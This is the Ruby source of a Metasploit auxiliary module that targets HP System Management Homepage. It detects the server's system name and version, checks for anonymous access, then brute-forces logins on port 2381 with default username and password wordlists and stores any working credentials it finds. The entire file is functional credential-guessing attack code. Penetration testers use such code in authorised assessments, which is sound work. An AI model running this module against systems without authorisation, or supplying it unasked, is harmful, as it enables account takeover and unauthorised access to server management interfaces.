##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/smh'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => "HP System Management Homepage Login Utility",
      'Description'    => %q{
        This module attempts to login to HP System Management Homepage using host
        operating system authentication.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'DefaultOptions' =>
        {
          'SSL' => true,
          'RPORT' => 2381,
          'USERPASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt"),
          'USER_FILE' => File.join(Msf::Config.data_directory, "wordlists", "unix_users.txt"),
          'PASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "unix_passwords.txt")
        }
    ))

    register_advanced_options([
      OptString.new('LOGIN_URL', [true, 'The URL that handles the login process', '/proxy/ssllogin']),
      OptString.new('CPQLOGIN', [true, 'The homepage of the login', '/cpqlogin.htm']),
      OptString.new('LOGIN_REDIRECT', [true, 'The URL to redirect to', '/cpqlogin'])
    ])

    deregister_options('PASSWORD_SPRAY')
  end

  def get_version(res)
    if res
      return res.body.scan(/smhversion = "HP System Management Homepage v([\d\.]+)"/i).flatten[0] || ''
    end

    ''
  end

  def is_version_tested?(version)
    # As of Sep 4 2014, version 7.4 is the latest and that's the last one we've tested
    if Gem::Version.new(version) < Gem::Version.new('7.5')
      return true
    end

    false
  end

  def get_system_name(res)
    if res
      return res.body.scan(/fullsystemname = "(.+)"/i).flatten[0] || ''
    end

    ''
  end

  def anonymous_access?(res)
    return true if res and res.body =~ /username = "hpsmh_anonymous"/
    false
  end

  def init_loginscanner(ip)
    @cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file:       datastore['PASS_FILE'],
      password:        datastore['HttpPassword'],
      user_file:       datastore['USER_FILE'],
      userpass_file:   datastore['USERPASS_FILE'],
      username:        datastore['HttpUsername'],
      user_as_pass:    datastore['USER_AS_PASS']
    )

    @scanner = Metasploit::Framework::LoginScanner::Smh.new(
      configure_http_login_scanner(
        uri:                datastore['LOGIN_URL'],
        cred_details:       @cred_collection,
        stop_on_success:    datastore['STOP_ON_SUCCESS'],
        bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username:      datastore['HttpUsername'],
        http_password:      datastore['HttpPassword']
      )
    )
  end

 def do_report(ip, port, result)
    service_data = {
      address: ip,
      port: port,
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: :password,
      username: result.credential.public,
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: result.status
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def bruteforce(ip)
    @scanner.scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
        do_report(ip, rport, result)
        :next_user
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        if datastore['VERBOSE']
          print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
        end
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
        )
        :abort
      when Metasploit::Model::Login::Status::INCORRECT
        if datastore['VERBOSE']
          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
        end
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
        )
      end
    end
  end


  def run_host(ip)
    res = send_request_cgi({
      'uri' => datastore['CPQLOGIN'],
      'method' => 'GET',
      'vars_get' => {
        'RedirectUrl' => datastore['LOGIN_REDIRECT'],
        'RedirectQueryString' => ''
      }
    })

    sys_name = get_system_name(res)

    if sys_name.blank?
      print_error 'Could not retrieve system name.'
      return
    end

    version = get_version(res)
    unless version.blank?
      print_status("Version detected: #{version}")
      unless is_version_tested?(version)
        print_warning("You're running the module against a version we have not tested.")
      end
    end

    print_good("System name detected: #{sys_name}")
    report_note(
      :host => ip,
      :type => "system.name",
      :data => sys_name
    )

    if anonymous_access?(res)
      print_good("No login necessary. Server allows anonymous access.")
      return
    end

    init_loginscanner(ip)
    bruteforce(ip)
  end
end

